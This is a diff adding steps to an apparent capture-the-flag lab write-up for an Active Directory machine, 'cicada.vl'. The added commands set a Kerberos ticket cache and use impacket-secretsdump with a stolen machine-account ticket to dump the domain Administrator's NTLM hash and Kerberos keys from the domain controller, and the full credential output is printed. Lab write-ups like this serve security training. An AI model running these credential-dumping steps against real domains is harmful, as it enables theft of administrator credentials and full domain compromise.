@@ -582,6 +582,24 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
 ```
 
+```
+ export KRB5CCNAME=dc-jpq225.ccache
+```
+
+```
+impacket-secretsdump -k -no-pass -dc-ip 10.129.150.101 cicada.vl/'dc-jpq225$'@DC-JPQ225.cicada.vl -just-dc-user Administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
+Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
+Administrator:des-cbc-md5:fd2a29621f3e7604
+[*] Cleaning up... 
+
+```
 ---
 ## User Flag
 
